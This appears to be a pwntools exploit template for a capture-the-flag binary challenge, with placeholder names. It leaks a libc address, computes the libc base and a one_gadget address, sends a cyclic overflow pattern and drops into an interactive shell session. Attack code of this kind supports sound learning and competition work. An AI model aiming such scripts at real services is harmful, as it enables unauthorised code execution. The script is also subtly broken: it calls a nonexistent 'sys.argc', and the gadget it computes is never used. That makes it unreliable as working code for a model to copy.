#!/usr/bin/env python

from pwn import *
import subprocess
import sys

bn = './asdf'
host = 'asdf'
port = 1337
libc_so = './libc.so.6'

binary = ELF(bn)
libc = ELF(libc_so)

debug = False
# debug = True

ctx = 'local'
# ctx = 'pwndocker'
# ctx = 'remote'

if ctx == 'local':
    context.terminal = ['kitty', '-e', 'sh', '-c']
    r = process(bn); gdb.attach(r)
elif ctx == 'pwndocker':
    context.terminal = ['tmux', 'splitw', '-h']
    r = process(bn, env = {'LD_PRELOAD': libc_so}); gdb.attach(r)
else:
    r = remote(host, port)

if debug: context.log_level = 'DEBUG'

# for picking which one gadget to run
if sys.argc == 2:
    choice = int(sys.argv[1])
else:
    choice = 0

def one_gadgets(filename):
    return list(map(
        int,
        subprocess.check_output(['one_gadget', '--raw', filename]).split(b' ')
    ))

def get_base(leak, symbol, lib=True):
    if lib: base = leak - libc.symbols[symbol]
    else: base = leak - binary.symbols[symbol]
    return base


# points of interest (POI)
gets = libc.symbols['gets']
gadget = one_gadgets(libc_so)[choice]

# leaks
leak = int(r.recv().strip().split(b' ')[0], 16)
base = get_base(leak, 'system')
rebase = lambda x: x + base

# logging
log.warn('===== juicy details =====')
log.warn('libc base 0x%08x' % base)
log.warn('gets 0x%08x' % gets)
log.warn('gadget 0x%08x' % gadget)

# exploit
r.sendline(cyclic(0xff))

r.interactive()
